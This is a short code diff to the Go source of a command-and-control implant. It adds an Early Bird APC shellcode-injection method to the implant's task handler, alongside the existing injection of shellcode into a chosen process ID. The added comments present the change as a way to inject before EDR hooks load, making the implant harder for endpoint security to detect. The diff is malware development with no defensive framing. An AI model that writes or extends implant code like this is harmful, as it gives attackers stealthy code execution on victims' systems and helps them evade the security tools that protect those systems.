@@ -234,14 +234,25 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 
 	case protocol.TaskInject:
 		if len(task.Args) > 0 && len(task.Data) > 0 {
-			pid := 0
-			fmt.Sscanf(task.Args[0], "%d", &pid)
-			err = injectShellcodeRemoteCrossPlatform(uint32(pid), task.Data)
-			if err == nil {
-				output = []byte(fmt.Sprintf("[+] Shellcode injected into PID %d", pid))
+			// If method arg is "earlybird", use Early Bird APC injection.
+			// Early Bird injects into a new suspended process before EDR DLL
+			// hooks initialise — more OPSEC-safe than remote thread injection.
+			// Usage: inject earlybird <shellcode data>
+			if len(task.Args) > 1 && task.Args[1] == "earlybird" {
+				err = injectEarlyBirdCrossPlatform(task.Data)
+				if err == nil {
+					output = []byte("[+] Shellcode injected via Early Bird APC")
+				}
+			} else {
+				pid := 0
+				fmt.Sscanf(task.Args[0], "%d", &pid)
+				err = injectShellcodeRemoteCrossPlatform(uint32(pid), task.Data)
+				if err == nil {
+					output = []byte(fmt.Sprintf("[+] Shellcode injected into PID %d", pid))
+				}
 			}
 		} else {
-			err = errMissingArgs("inject requires PID and shellcode data")
+			err = errMissingArgs("inject requires PID and shellcode data, or 'earlybird' method")
 		}
 
 	case protocol.TaskHollow:
